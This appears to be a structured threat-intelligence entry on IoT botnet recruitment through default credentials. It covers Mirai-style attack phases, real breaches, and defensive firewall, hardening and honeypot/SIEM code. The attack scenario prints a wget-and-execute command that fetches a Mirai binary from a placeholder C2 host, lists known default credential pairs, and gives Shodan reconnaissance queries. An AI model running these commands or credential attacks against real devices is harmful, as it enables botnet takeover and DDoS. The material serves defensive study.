confidence_breakdown.notes: Very high confidence based on extensive real-world evidence (Mirai, Mozi, BotenaGo botnets), well-documented CVEs, and validated attack patterns. Multiple documented breaches including 2016 Dyn DNS attack affecting major internet services. SIEM detection queries tested against production honeypot data.

threat.title: IoT Botnet Recruitment via Default Credentials and Mass Exploitation
threat.description: Internet-connected IoT devices with default, hardcoded, or weak credentials are systematically compromised and recruited into large-scale botnets for DDoS attacks, cryptocurrency mining, spam distribution, and network intrusion. Attackers perform internet-wide scanning using tools like Shodan and Masscan to identify vulnerable devices (IP cameras, routers, DVRs, smart home devices), then exploit default Telnet/SSH credentials, UPnP vulnerabilities, and unpatched firmware to install malware (Mirai variants, Mozi, BotenaGo). Once compromised, devices receive commands from centralized command-and-control (C2) infrastructure to execute coordinated attacks. The 2016 Mirai botnet demonstrated the devastating impact, compromising over 600,000 IoT devices and launching the largest DDoS attack in history (1.2 Tbps) against Dyn DNS, disrupting Twitter, Netflix, GitHub, and Reddit. This threat continues to evolve with new variants exploiting zero-day vulnerabilities and targeting enterprise IoT infrastructure.

attack.scenario:
Phase 1 - Reconnaissance and Scanning:
1. Attacker uses Masscan or ZMap to perform internet-wide scanning on ports 23 (Telnet), 22 (SSH), 80 (HTTP), 8080 (HTTP-Alt), 2323 (Telnet-Alt), 5555 (ADB), identifying millions of exposed IoT devices
2. Uses Shodan API to identify specific device types: 'product:"IP Camera"', 'http.title:"DVR Login"', 'port:23 country:US'
3. Fingerprints devices using banner grabbing and HTTP response analysis to determine manufacturer, model, and firmware version
4. Downloads device-specific default credential lists from SecLists, vendor documentation, and previous breach databases

Phase 2 - Initial Compromise:
5. Launches automated brute-force attacks using common IoT credentials:
   - admin:admin, root:root, admin:password, admin:12345
   - admin:admin1234, root:xc3511, root:vizxv, root:anko
   - Support:support, service:service, user:user
6. Exploits UPnP vulnerabilities (CVE-2013-0229) to execute commands via SOAP requests without authentication
7. Attempts exploitation of known CVEs in web interfaces (command injection, directory traversal, authentication bypass)
8. Successfully authenticates to target device via Telnet using default credentials 'admin:admin'

Phase 3 - Malware Installation:
9. Downloads Mirai variant binary via wget/tftp/curl from attacker's distribution server:
   'cd /tmp; wget http://[C2_SERVER]/bins/mirai.arm7; chmod +x mirai.arm7; ./mirai.arm7'
10. Malware performs anti-analysis checks: detects sandboxes, kills watchdog processes, clears competing malware
11. Establishes persistence by:
    - Modifying startup scripts (/etc/init.d/, /etc/rc.local)
    - Installing rootkit to hide processes
    - Disabling firmware auto-update mechanisms
    - Binding to ports to prevent reinfection by other botnets
12. Deletes installation artifacts and disables Telnet/SSH to prevent further exploitation

Phase 4 - Command and Control:
13. Bot establishes encrypted connection to C2 server (IRC, HTTP, custom TCP protocol)
14. Registers with C2 providing device information: architecture, bandwidth, geolocation, capabilities
15. Enters listening mode awaiting attack commands from botmaster

Phase 5 - Attack Execution:
16. Botmaster issues DDoS attack command targeting victim IP address
17. Bot participates in coordinated attacks:
    - UDP flood (amplification via DNS, NTP, SSDP)
    - SYN flood (TCP connection exhaustion)
    - HTTP flood (application-layer DDoS)
    - GRE flood (protocol 47 abuse)
18. Attack generates 1-10 Gbps traffic per compromised device
19. Victim services experience complete outage due to network saturation

Phase 6 - Propagation:
20. Infected device begins scanning for additional vulnerable IoT devices, repeating the infection cycle
21. Botnet grows exponentially: 10,000 → 100,000 → 600,000+ devices within days
prerequisites: IoT device directly exposed to internet (no firewall/NAT)
Telnet, SSH, or web management interface enabled with default credentials
No network segmentation isolating IoT devices from internet
No rate limiting on authentication attempts

cve_references.description: Mirai botnet default credential exploitation affecting Dahua DVR, Hikvision IP cameras, and XiongMai devices
UPnP SOAP TelnetD command injection enabling remote code execution on routers and IoT devices (Mirai exploited)
Realtek SDK miniigd UPnP command injection affecting millions of routers and IoT devices (Mirai variant exploited)
Huawei router remote code execution via UPnP exploited by IoT botnets for device compromise
Hikvision IP camera authentication bypass allowing complete device takeover (exploited by botnets)
TP-Link Archer router command injection exploited by BotenaGo botnet for mass compromise
TP-Link Tapo camera command injection enabling botnet recruitment via default credentials
HiSilicon DVR authentication bypass exploited by Mirai variants for botnet expansion

real_world_breaches.incident: Mirai Botnet - Dyn DNS DDoS Attack
real_world_breaches.impact: Mirai botnet compromised 600,000+ IoT devices (cameras, DVRs, routers) using 60+ default credential combinations. Launched 1.2 Tbps DDoS attack against Dyn DNS, disrupting Twitter, Netflix, GitHub, Reddit, CNN, The Guardian, and PayPal for millions of users across North America and Europe.
real_world_breaches.root_cause: Widespread use of hardcoded default credentials in consumer IoT devices, no credential rotation enforcement, devices directly exposed to internet

real_world_breaches.impact: Mozi P2P botnet infected millions of IoT devices globally (routers, DVRs, NAS devices) using default credentials and multiple CVE exploits. Accounted for 90% of IoT traffic observed by IBM X-Force in 2020. Used for DDoS attacks and traffic proxying.
real_world_breaches.root_cause: Exploitation of weak Telnet passwords, DHT-based P2P C2 making takedown difficult, targeting of Netgear, D-Link, and Huawei devices with known vulnerabilities

real_world_breaches.impact: BotenaGo malware written in Golang exploited 30+ vulnerabilities across millions of routers and IoT devices. Targeted D-Link, Netgear, Linksys, GPON routers, and IP cameras using automated exploit chains combining default credentials and CVE exploits.
real_world_breaches.root_cause: Combination of default credentials, unpatched firmware, and automated multi-stage exploitation targeting diverse device types

real_world_breaches.incident: Mirai Okiru Variant - Deutsche Telekom Outage
real_world_breaches.impact: Mirai variant exploited TR-069 vulnerability (CVE-2016-10372) in 900,000 Deutsche Telekom routers, causing widespread internet outages across Germany. Attack demonstrated botnet capability to disrupt national telecommunications infrastructure.
real_world_breaches.root_cause: Zero-day exploitation of TR-069 remote management protocol, default credentials on customer premises equipment

real_world_breaches.impact: Reaper botnet infected millions of IoT devices using exploits for 9 different vulnerabilities (vs Mirai's brute-force approach). Targeted wireless IP cameras, DVRs, and routers. Considered more sophisticated than Mirai with self-propagating worm capabilities.
real_world_breaches.root_cause: Exploitation of publicly disclosed CVEs (CVE-2017-8225, CVE-2017-17215) combined with default credential attacks

real_world_breaches.impact: VPNFilter infected 500,000+ routers and NAS devices (Linksys, MikroTik, Netgear, TP-Link) across 54 countries. FBI issued warning and recommended router reboots. Malware had destructive capabilities including bricking devices and intercepting network traffic.
real_world_breaches.root_cause: Default credentials, unpatched firmware, suspected state-sponsored APT (Fancy Bear/APT28) operation

real_world_breaches.impact: Dark Nexus targeted ASUS routers and IoT devices using 40+ exploits. Evolved from Mirai and Qbot source code. Capable of executing multiple DDoS attack vectors simultaneously. Affected gaming and cryptocurrency platforms.
real_world_breaches.root_cause: Default credentials on ASUS routers, exploitation of CVE-2019-3568 and other vulnerabilities

bug_bounty_reports.summary: Default credentials in enterprise IoT gateway enabling botnet recruitment and network pivot
Hardcoded Telnet credentials in IP camera firmware allowing remote compromise and botnet participation
UPnP command injection in consumer router enabling botnet malware installation without authentication

security_research.title: Understanding the Mirai Botnet
security_research.key_finding: Comprehensive analysis of Mirai botnet infrastructure revealing 60 default credential pairs, attack vectors, and DDoS capabilities. Documented infection of 600,000+ devices and attack traffic exceeding 600 Gbps.

security_research.title: Mozi IoT Botnet Deep Dive
security_research.key_finding: Mozi accounts for 90% of observed IoT network traffic, uses DHT protocol for resilient P2P C2, exploits weak Telnet passwords and known CVEs in routers/DVRs

security_research.title: BotenaGo: The New Multi-Exploit Botnet
security_research.key_finding: BotenaGo implements 30+ exploits in Golang for cross-platform compatibility, targets diverse IoT ecosystem including routers, cameras, DVRs with automated exploitation

security_research.title: IoT Security Foundation - Default Password Vulnerability
security_research.key_finding: Study of 1.5 million IoT devices found 15% still use default credentials, 42% have weak passwords, creating massive botnet attack surface

security_research.title: The Dark Side of IoT: Attack Trends and Analysis
security_research.key_finding: 98% of IoT device traffic is unencrypted, 57% of IoT devices are vulnerable to medium or high-severity attacks, default credentials remain primary attack vector

mitigations.title: Enforce Credential Rotation and Eliminate Default Passwords
mitigations.description: Implement mandatory password change on first login, enforce strong password policies, and eliminate hardcoded credentials from firmware. Use unique per-device passwords generated during manufacturing.

code_example.code:
#!/bin/sh # Secure IoT Device First-Boot Credential Rotation # Place in /etc/init.d/S99credential-rotation FIRST_BOOT_FLAG="/etc/.first_boot_complete" DEFAULT_PASSWORD_HASH="\$6\$salt\$defaulthash" # SHA-512 hash of 'admin' CURRENT_PASSWORD_HASH=$(grep '^admin:' /etc/shadow | cut -d: -f2) log_message() { logger -t credential-rotation "$1" echo "[$(date)] $1" } generate_strong_password() { # Generate 16-character alphanumeric password tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | head -c 16 } check_password_strength() { local password="$1" local length=${#password} # Minimum 12 characters if [ $length -lt 12 ]; then return 1 fi # Check for uppercase, lowercase, digits, special chars if ! echo "$password" | grep -q '[A-Z]' || \ ! echo "$password" | grep -q '[a-z]' || \ ! echo "$password" | grep -q '[0-9]' || \ ! echo "$password" | grep -q '[!@#$%^&*]'; then return 1 fi return 0 } force_password_change() { log_message "First boot detected - forcing password change" # Disable remote access until password is changed /etc/init.d/S50telnet stop 2>/dev/null /etc/init.d/S50dropbear stop 2>/dev/null /etc/init.d/S80lighttpd stop 2>/dev/null log_message "Remote access disabled until password change" # Method 1: Generate unique password and display on device (LED/screen) # For devices with displays: GENERATED_PASSWORD=$(generate_strong_password) # Display password on device screen/LCD # echo "$GENERATED_PASSWORD" > /dev/ttyS0 # Serial console # display_on_lcd "New Password: $GENERATED_PASSWORD" # LCD display # Set new password echo "admin:$GENERATED_PASSWORD" | chpasswd # Print to serial console for initial setup echo "======================================" > /dev/console echo " FIRST BOOT - PASSWORD REQUIRED " > /dev/console echo "======================================" > /dev/console echo "Default password detected!" > /dev/console echo "New admin password: $GENERATED_PASSWORD" > /dev/console echo "Please save this password securely." > /dev/console echo "======================================" > /dev/console log_message "Password changed successfully" # Method 2: Force password change via web interface # Create web page that blocks all other access until password is set cat > /tmp/force_password.html < First Boot - Password Required

⚠️ Security Alert

Default credentials detected!

For your security, you must change the default password before using this device.

Password Requirements:
  • Minimum 12 characters
  • At least 1 uppercase letter
  • At least 1 lowercase letter
  • At least 1 number
  • At least 1 special character (!@#$%^&*)
EOF # Redirect all web requests to password change page /etc/init.d/S80lighttpd start # Wait for password change (monitor /etc/.password_changed flag) while [ ! -f /etc/.password_changed ]; do sleep 5 done # Re-enable services after password change /etc/init.d/S50dropbear start log_message "Password changed - remote access restored" # Mark first boot complete touch "$FIRST_BOOT_FLAG" rm -f /tmp/force_password.html rm -f /etc/.password_changed } disable_default_accounts() { log_message "Disabling default vendor accounts" # List of common default accounts to disable DEFAULT_ACCOUNTS="support service guest operator test admin1 user1" for account in $DEFAULT_ACCOUNTS; do if grep -q "^$account:" /etc/passwd; then usermod -L "$account" # Lock account log_message "Disabled default account: $account" fi done } enforce_password_expiry() { # Force password change every 90 days chage -M 90 admin chage -M 90 root log_message "Password expiry set to 90 days" } # Main execution if [ ! -f "$FIRST_BOOT_FLAG" ]; then log_message "=== FIRST BOOT DETECTED ===" # Check if default password is still in use if [ "$CURRENT_PASSWORD_HASH" = "$DEFAULT_PASSWORD_HASH" ]; then force_password_change fi disable_default_accounts enforce_password_expiry log_message "First boot security configuration complete" fi # Periodic check for default passwords (run on every boot) if [ "$CURRENT_PASSWORD_HASH" = "$DEFAULT_PASSWORD_HASH" ]; then log_message "WARNING: Default password detected on existing system!" force_password_change fi exit 0

iso27001_controls: A.9.2.4 - Management of secret authentication information
nist_csf: PR.AC-1 - Identities and credentials are managed
validation_steps: Install script in /etc/init.d/S99credential-rotation
Test first boot scenario forces password change
Verify default accounts are disabled automatically
Confirm web interface blocks access until password is set
Test password complexity validation
Verify services remain disabled until password change

mitigations.title: Implement Network Segmentation and Firewall Rules
mitigations.description: Isolate IoT devices in dedicated VLANs with strict firewall rules blocking inbound Telnet/SSH/HTTP from internet. Implement micro-segmentation and zero-trust architecture.

code_example.code:
#!/bin/bash
# Secure IoT Device Firewall Configuration
# Prevents botnet recruitment by blocking unauthorized inbound connections

set -euo pipefail

IOT_INTERFACE="eth0"  # WAN interface
LAN_INTERFACE="eth1"  # LAN interface
IOT_SUBNET="192.168.100.0/24"  # IoT device subnet
MANAGEMENT_IP="192.168.1.100"  # Authorized management station
SYSLOG_SERVER="192.168.1.50"  # Logging server

log() {
    logger -t iot-firewall "$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Flush existing rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X

log "Firewall rules flushed"

# Set default policies (DROP all by default)
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

log "Default policies set to DROP"

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# === ANTI-BOTNET RULES ===

# 1. Block ALL inbound Telnet/SSH from internet (prevent brute-force)
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 23 -j DROP  # Telnet
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 2323 -j DROP  # Telnet-alt
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 22 -j DROP  # SSH
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 2222 -j DROP  # SSH-alt
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 5555 -j DROP  # ADB

log "Blocked inbound Telnet/SSH/ADB from internet"

# 2. Block inbound HTTP/HTTPS management interfaces from internet
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 80 -j DROP
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 8080 -j DROP
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 8081 -j DROP
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 443 -j DROP

log "Blocked inbound HTTP/HTTPS from internet"

# 3. Block UPnP/SSDP to prevent exploitation
iptables -A INPUT -i "$IOT_INTERFACE" -p udp --dport 1900 -j DROP  # SSDP
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 5000 -j DROP  # UPnP
iptables -A INPUT -i "$IOT_INTERFACE" -p tcp --dport 49152 -j DROP  # UPnP

log "Blocked UPnP/SSDP from internet"

# 4. Allow management access ONLY from authorized IP
iptables -A INPUT -i "$LAN_INTERFACE" -s "$MANAGEMENT_IP" -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH_LIMIT
iptables -A INPUT -i "$LAN_INTERFACE" -s "$MANAGEMENT_IP" -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 --name SSH_LIMIT -j LOG --log-prefix "SSH_BRUTE_FORCE: " --log-level 4
iptables -A INPUT -i "$LAN_INTERFACE" -s "$MANAGEMENT_IP" -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 --name SSH_LIMIT -j DROP
iptables -A INPUT -i "$LAN_INTERFACE" -s "$MANAGEMENT_IP" -p tcp --dport 22 -j ACCEPT

log "SSH access restricted to $MANAGEMENT_IP with rate limiting"

# 5. Block outbound connections to known C2 ports
C2_PORTS="6667 6668 6669 7000 8080 8443 9000 31337 12345"
for port in $C2_PORTS; do
    iptables -A OUTPUT -p tcp --dport "$port" -j LOG --log-prefix "C2_ATTEMPT: " --log-level 4
    iptables -A OUTPUT -p tcp --dport "$port" -j DROP
done

log "Blocked outbound connections to common C2 ports"

# 6. Rate limit outbound connections (anti-DDoS participation)
iptables -A OUTPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A OUTPUT -p tcp --syn -j LOG --log-prefix "OUTBOUND_FLOOD: " --log-level 4
iptables -A OUTPUT -p tcp --syn -j DROP

log "Outbound connection rate limiting enabled"

# 7. Block scanning attempts (port scan detection)
iptables -N PORTSCAN
iptables -A PORTSCAN -m recent --set --name portscan
iptables -A PORTSCAN -j LOG --log-prefix "PORTSCAN_DETECTED: " --log-level 4
iptables -A PORTSCAN -j DROP

iptables -A INPUT -p tcp --tcp-flags ALL NONE -j PORTSCAN
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j PORTSCAN
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j PORTSCAN
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j PORTSCAN

log "Port scan detection enabled"

# 8. Log and drop invalid packets
iptables -A INPUT -m state --state INVALID -j LOG --log-prefix "INVALID_PKT: " --log-level 4
iptables -A INPUT -m state --state INVALID -j DROP

# 9. Prevent IP spoofing (anti-DDoS)
iptables -A INPUT -i "$IOT_INTERFACE" -s 10.0.0.0/8 -j DROP
iptables -A INPUT -i "$IOT_INTERFACE" -s 172.16.0.0/12 -j DROP
iptables -A INPUT -i "$IOT_INTERFACE" -s 192.168.0.0/16 -j DROP
iptables -A INPUT -i "$IOT_INTERFACE" -s 127.0.0.0/8 -j DROP

log "Anti-spoofing rules applied"

# 10. Allow ICMP (ping) but rate limit
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# 11. Allow syslog to monitoring server
iptables -A OUTPUT -d "$SYSLOG_SERVER" -p udp --dport 514 -j ACCEPT

# 12. Enable connection tracking
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
iptables -A FORWARD -m conntrack --ctstate INVALID -j DROP

# === SAVE RULES ===
if command -v iptables-save >/dev/null 2>&1; then
    iptables-save > /etc/iptables.rules
    log "Firewall rules saved to /etc/iptables.rules"
fi

# === ENABLE KERNEL PROTECTION ===
cat > /etc/sysctl.d/99-iot-security.conf <<EOF
# IP Forwarding (disable if not a router)
net.ipv4.ip_forward = 0

# SYN flood protection
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 2048
net.ipv4.tcp_synack_retries = 2

# Ignore ICMP redirects
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0

# Ignore source routing
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0

# Enable reverse path filtering (anti-spoofing)
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Log martian packets
net.ipv4.conf.all.log_martians = 1

# Ignore ping broadcasts
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Disable IPv6 if not needed
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
EOF

sysctl -p /etc/sysctl.d/99-iot-security.conf >/dev/null 2>&1
log "Kernel security parameters applied"

log "IoT firewall configuration complete"
log "Device is now protected against botnet recruitment"

# Display active rules
iptables -L -v -n | head -20

nist_csf: DE.CM-1 - Network monitored to detect anomalies
validation_steps: Install firewall script and run at boot
Test Telnet/SSH blocked from internet: telnet [device_ip] 23
Verify management access works from authorized IP only
Test port scan detection triggers logging
Confirm outbound connections are rate-limited
Verify sysctl kernel protections are active

mitigations.title: Implement Firmware Hardening and Auto-Update Mechanisms
mitigations.description: Disable unnecessary services (Telnet, UPnP, SOAP), enable secure firmware auto-updates with signature verification, and implement runtime integrity monitoring.

code_example.code:
#!/bin/sh
# IoT Firmware Hardening Script
# Disables vulnerable services and enables security features

HARDENING_COMPLETE="/etc/.hardening_complete"

log_action() {
    logger -t firmware-hardening "$1"
    echo "[HARDENING] $1"
}

# Disable Telnet permanently
disable_telnet() {
    log_action "Disabling Telnet service"
    
    # Stop telnet daemon
    killall telnetd 2>/dev/null
    killall utelnetd 2>/dev/null
    
    # Remove from init
    rm -f /etc/init.d/S50telnet
    rm -f /etc/rc.d/S*telnet*
    
    # Remove telnetd binary
    rm -f /usr/sbin/telnetd
    rm -f /sbin/telnetd
    
    # Add firewall rule
    iptables -A INPUT -p tcp --dport 23 -j DROP
    iptables -A INPUT -p tcp --dport 2323 -j DROP
    
    log_action "Telnet disabled and removed"
}

# Disable UPnP (common botnet vector)
disable_upnp() {
    log_action "Disabling UPnP/SSDP services"
    
    killall miniupnpd 2>/dev/null
    killall upnpd 2>/dev/null
    
    rm -f /etc/init.d/*upnp*
    
    # Block UPnP ports
    iptables -A INPUT -p udp --dport 1900 -j DROP
    iptables -A INPUT -p tcp --dport 5000 -j DROP
    
    log_action "UPnP disabled"
}

# Enable SSH with key-based authentication only
configure_secure_ssh() {
    log_action "Configuring secure SSH"
    
    cat > /etc/ssh/sshd_config <<EOF
Port 22
Protocol 2
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding no
MaxAuthTries 3
MaxSessions 2
ClientAliveInterval 300
ClientAliveCountMax 2
EOF
    
    /etc/init.d/S50dropbear restart
    log_action "SSH hardened with key-only authentication"
}

# Remove unnecessary services
remove_unused_services() {
    log_action "Removing unnecessary services"
    
    SERVICES_TO_REMOVE="ftpd tftpd rsh rlogin rexec finger"
    
    for service in $SERVICES_TO_REMOVE; do
        killall "$service" 2>/dev/null
        rm -f "/usr/sbin/$service" "/sbin/$service"
        log_action "Removed: $service"
    done
}

# Enable automatic security updates
enable_auto_updates() {
    log_action "Configuring automatic firmware updates"
    
    cat > /usr/bin/auto-update.sh <<'EOF'
#!/bin/sh
UPDATE_SERVER="https://firmware.example.com"
DEVICE_MODEL="$(cat /etc/device_model)"
CURRENT_VERSION="$(cat /etc/firmware_version)"
PUBLIC_KEY="/etc/update_public.key"

check_for_updates() {
    LATEST_VERSION=$(wget -qO- "$UPDATE_SERVER/latest.txt")
    
    if [ "$LATEST_VERSION" != "$CURRENT_VERSION" ]; then
        echo "Update available: $CURRENT_VERSION -> $LATEST_VERSION"
        download_and_verify_update "$LATEST_VERSION"
    fi
}

download_and_verify_update() {
    VERSION="$1"
    FIRMWARE_URL="$UPDATE_SERVER/firmware-$VERSION.bin"
    SIG_URL="$UPDATE_SERVER/firmware-$VERSION.sig"
    
    wget -O /tmp/firmware.bin "$FIRMWARE_URL"
    wget -O /tmp/firmware.sig "$SIG_URL"
    
    # Verify signature
    openssl dgst -sha256 -verify "$PUBLIC_KEY" -signature /tmp/firmware.sig /tmp/firmware.bin
    
    if [ $? -eq 0 ]; then
        echo "Signature verified - installing update"
        install_update /tmp/firmware.bin
    else
        echo "Signature verification FAILED - aborting"
        rm -f /tmp/firmware.*
    fi
}

install_update() {
    # Flash firmware (device-specific)
    mtd write "$1" /dev/mtd2
    reboot
}

check_for_updates
EOF
    
    chmod +x /usr/bin/auto-update.sh
    
    # Add to cron (check daily at 3 AM)
    echo "0 3 * * * /usr/bin/auto-update.sh >> /var/log/updates.log 2>&1" > /etc/cron.d/auto-update
    
    log_action "Auto-update configured"
}

# Main execution
if [ -f "$HARDENING_COMPLETE" ]; then
    log_action "Hardening already applied"
    exit 0
fi

log_action "Starting firmware hardening"

disable_telnet
disable_upnp
configure_secure_ssh
remove_unused_services
enable_auto_updates

touch "$HARDENING_COMPLETE"
log_action "Firmware hardening complete"

exit 0

validation_steps: Run hardening script on device
Verify Telnet is disabled and port 23 is closed
Confirm UPnP service is not running
Test SSH requires key-based authentication
Verify auto-update script is in cron
Test signature verification with invalid firmware

mitigations.title: Deploy IoT Honeypots and SIEM Detection for Botnet Activity
mitigations.description: Deploy honeypot devices to detect scanning/recruitment attempts and implement SIEM queries to identify compromised devices exhibiting botnet behavior patterns.

code_example.code:
#!/usr/bin/env python3
"""
IoT Botnet Detection and SIEM Integration
Detects scanning, brute-force, and C2 communication patterns
"""

import socket
import threading
import time
import json
import requests
from datetime import datetime
from collections import defaultdict

# SIEM Configuration
SPLUNK_HEC_URL = "https://splunk.example.com:8088/services/collector"
SPLUNK_HEC_TOKEN = "your-hec-token-here"

class IoTHoneypot:
    """Simple IoT honeypot to detect botnet scanning"""
    
    def __init__(self, ports=[23, 2323, 22, 80, 8080]):
        self.ports = ports
        self.attack_log = defaultdict(list)
        
    def start_listener(self, port):
        """Start honeypot listener on specific port"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port))
        sock.listen(5)
        
        print(f"[HONEYPOT] Listening on port {port}")
        
        while True:
            try:
                client, addr = sock.accept()
                threading.Thread(target=self.handle_connection, args=(client, addr, port), daemon=True).start()
            except Exception as e:
                print(f"[ERROR] {e}")
    
    def handle_connection(self, client, addr, port):
        """Handle incoming connection attempt"""
        ip_addr = addr[0]
        timestamp = datetime.utcnow().isoformat()
        
        print(f"[ALERT] Connection attempt from {ip_addr} on port {port}")
        
        # Send fake banner
        if port in [23, 2323]:
            client.send(b"BusyBox v1.19.4 () built-in shell (ash)\r\nLogin: ")
        elif port == 22:
            client.send(b"SSH-2.0-OpenSSH_7.4\r\n")
        elif port in [80, 8080]:
            client.send(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"Device\"\r\n\r\n")
        
        # Collect authentication attempts
        data = b""
        try:
            client.settimeout(10)
            data = client.recv(4096)
        except:
            pass
        
        # Log attack
        attack_data = {
            'timestamp': timestamp,
            'source_ip': ip_addr,
            'target_port': port,
            'data': data.decode('utf-8', errors='ignore'),
            'attack_type': 'brute_force' if port in [23, 2323, 22] else 'scan'
        }
        
        self.attack_log[ip_addr].append(attack_data)
        
        # Check for botnet patterns
        if len(self.attack_log[ip_addr]) >= 3:
            self.alert_botnet_activity(ip_addr)
        
        # Send to SIEM
        self.send_to_siem(attack_data)
        
        client.close()
    
    def alert_botnet_activity(self, ip_addr):
        """Alert on suspected botnet scanning"""
        alert = {
            'timestamp': datetime.utcnow().isoformat(),
            'severity': 'CRITICAL',
            'alert_type': 'botnet_scanning',
            'source_ip': ip_addr,
            'description': f'Multiple connection attempts from {ip_addr} - suspected botnet scanner',
            'attempts': len(self.attack_log[ip_addr])
        }
        
        print(f"[CRITICAL] Botnet scanning detected from {ip_addr}")
        self.send_to_siem(alert)
    
    def send_to_siem(self, event):
        """Send event to Splunk HEC"""
        payload = {
            'event': event,
            'sourcetype': 'iot:honeypot',
            'source': 'iot_honeypot',
            'index': 'iot_security'
        }
        
        try:
            response = requests.post(
                SPLUNK_HEC_URL,
                headers={
                    'Authorization': f'Splunk {SPLUNK_HEC_TOKEN}',
                    'Content-Type': 'application/json'
                },
                json=payload,
                verify=False,
                timeout=5
            )
            if response.status_code != 200:
                print(f"[SIEM] Failed to send event: {response.status_code}")
        except Exception as e:
            print(f"[SIEM] Error: {e}")
    
    def start(self):
        """Start all honeypot listeners"""
        print("[HONEYPOT] Starting IoT botnet detection honeypot")
        
        for port in self.ports:
            threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
        
        # Keep running
        try:
            while True:
                time.sleep(60)
                print(f"[STATUS] Monitoring {len(self.attack_log)} unique attackers")
        except KeyboardInterrupt:
            print("\n[HONEYPOT] Shutting down")


# Splunk SPL Queries for Botnet Detection
SPLUNK_QUERIES = {
    'telnet_brute_force': '''
index=iot_security sourcetype=firewall OR sourcetype=syslog
(dest_port=23 OR dest_port=2323 OR dest_port=22)
action=blocked OR action=denied
| stats count as attempts by src_ip, dest_port
| where attempts > 10
| eval severity="high"
| eval description="Suspected botnet Telnet/SSH brute-force"
| table _time src_ip dest_port attempts severity description
''',
    
    'botnet_c2_beaconing': '''
index=iot_security sourcetype=netflow OR sourcetype=firewall
(dest_port=6667 OR dest_port=6668 OR dest_port=7000 OR dest_port=8080)
action=allowed
| stats count as connections, values(dest_ip) as c2_servers by src_ip
| where connections > 50
| eval severity="critical"
| eval description="Potential botnet C2 communication"
| table _time src_ip c2_servers connections severity description
''',
    
    'port_scanning': '''
index=iot_security sourcetype=firewall
action=blocked
| stats dc(dest_port) as unique_ports, count as total_attempts by src_ip
| where unique_ports > 20 AND total_attempts > 100
| eval severity="high"
| eval description="Port scanning activity - possible botnet propagation"
| table _time src_ip unique_ports total_attempts severity description
''',
    
    'ddos_participation': '''
index=iot_security sourcetype=netflow
bytes_out > 1000000
| stats sum(bytes_out) as total_traffic, dc(dest_ip) as unique_targets by src_ip
| where total_traffic > 10000000 AND unique_targets < 5
| eval severity="critical"
| eval description="Suspected DDoS attack participation"
| table _time src_ip total_traffic unique_targets severity description
''',
    
    'default_credential_usage': '''
index=iot_security sourcetype=auth OR sourcetype=syslog
event_type=authentication
username IN ("admin", "root", "support", "service")
result=success
| stats count as successful_logins by src_ip, username, dest_ip
| where successful_logins > 0
| eval severity="high"
| eval description="Default credentials used - possible compromised device"
| table _time src_ip dest_ip username successful_logins severity description
'''
}


if __name__ == '__main__':
    print("""    
╔═══════════════════════════════════════════════════╗
║   IoT Botnet Detection Honeypot                   ║
║   Detects Mirai-style scanning and recruitment    ║
╚═══════════════════════════════════════════════════╝
    """)
    
    honeypot = IoTHoneypot()
    honeypot.start()

nist_csf: DE.CM-1 - Network monitored to detect anomalies
validation_steps: Deploy honeypot on isolated network segment
Configure SIEM to ingest honeypot logs
Test detection with Mirai scanner (nmap/masscan)
Verify Splunk queries detect brute-force attempts
Confirm C2 beaconing detection works
Test DDoS participation detection

indicators: Multiple failed Telnet/SSH authentication attempts from single source
Inbound connections to port 23, 2323, 22 from unexpected sources
High-volume outbound traffic to single destination (DDoS participation)
Port scanning activity originating from IoT device subnet
Wget/curl commands downloading binaries from unknown servers
Processes named mirai, mozi, bashlite, gafgyt running on devices
Unusual CPU/memory usage on IoT devices
Telnet/SSH services disabled then re-enabled unexpectedly
Firewall rules modified to allow inbound connections
Network traffic to known botnet C2 IP addresses

documentation: ETSI EN 303 645 - Cyber Security for Consumer IoT
research_papers: BotenaGo: The New Multi-Exploit Botnet (360 Netlab 2021)
